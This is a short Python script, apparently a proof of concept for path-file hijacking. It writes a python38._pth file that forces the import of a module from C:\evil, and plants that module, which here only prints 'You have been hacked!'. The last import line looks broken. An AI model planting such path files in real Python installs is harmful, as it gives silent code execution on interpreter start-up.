import os
import sys

pth_file = "python38._pth"
pth_content = "import site\nsys.path.append('C:\\\\evil')\nimport evil"

with open(pth_file, "w") as f:
    f.write(pth_content)

code_file = "evil.py"
code_content = "print('You have been hacked!')"

os.makedirs("C:\\evil", exist_ok=True)
with open("C:\\evil\\" + code_file, "w") as f:
    f.write(code_content)

sys.path.append(".")
import python38